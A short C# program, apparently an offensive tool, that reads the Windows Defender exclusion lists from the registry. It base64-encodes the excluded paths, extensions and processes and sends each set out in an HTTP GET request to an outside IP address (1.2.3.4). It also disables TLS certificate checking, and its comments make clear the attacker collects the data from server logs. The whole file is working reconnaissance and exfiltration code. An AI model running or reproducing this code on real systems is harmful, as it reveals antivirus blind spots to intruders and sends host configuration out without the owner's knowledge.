using System;
using System.Text;
using Microsoft.Win32;
using System.Net;
using System.IO;

class MainClass
{
    public static void Main(String[] args)
    {
        // Set the registry
        RegistryKey key = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows Defender\\Exclusions");

        //if it does exist exit
        if (key != null)
        {
            // Get all subkeys names from Exclusions
            var subkeys = key.GetSubKeyNames();

            // For each subkey found ....
            foreach (var subkey in subkeys)
            {
                RegistryKey skey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\"+subkey);
                //Console.WriteLine(subkey);
                
                // .. get values, trasform the array in a string, and encode in base64...
                string key_values = string.Join(", ", skey.GetValueNames());
                var key_values_bytes = Encoding.UTF8.GetBytes(key_values);
                
                // ... for each entry it makes a GET request to below url appending the base64 to GET request...
                var url = "https://1.2.3.4/";
                url += System.Convert.ToBase64String(key_values_bytes);
                
                // ... ignore certs error and enjoy HTTP request logs
                ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => { return true; };

                var request = WebRequest.Create(url);
                request.Method = "GET";

                var webResponse = request.GetResponse();
                var webStream = webResponse.GetResponseStream();

                var reader = new StreamReader(webStream);
                var data = reader.ReadToEnd();

                //Console.WriteLine(data);
                //Console.WriteLine(System.Convert.ToBase64String(key_values_bytes));
                skey.Close();

            }
            key.Close();
        }
        else
        { 
            Console.WriteLine("Nothing to see here!");
        }
    }
}
